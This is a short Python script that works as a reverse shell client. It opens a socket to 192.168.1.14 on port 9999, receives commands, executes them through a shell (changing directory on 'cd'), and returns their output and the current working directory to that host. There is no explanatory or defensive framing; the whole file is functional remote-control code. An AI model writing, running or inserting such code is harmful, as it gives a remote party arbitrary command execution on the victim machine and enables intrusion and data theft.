import socket
import os
import subprocess

host = '192.168.1.14'
port = 9999
s = socket.socket()
s.connect((host,port))
while True:
    data = s.recv(1024)

    if data[:2].decode("utf-8")=='cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        op_byte=cmd.stdout.read() + cmd.stderr.read()
        op_str= str(op_byte,"utf-8")
        pwd = os.getcwd() + "> "
        s.send(str.encode(op_str + pwd))

        print(op_str)
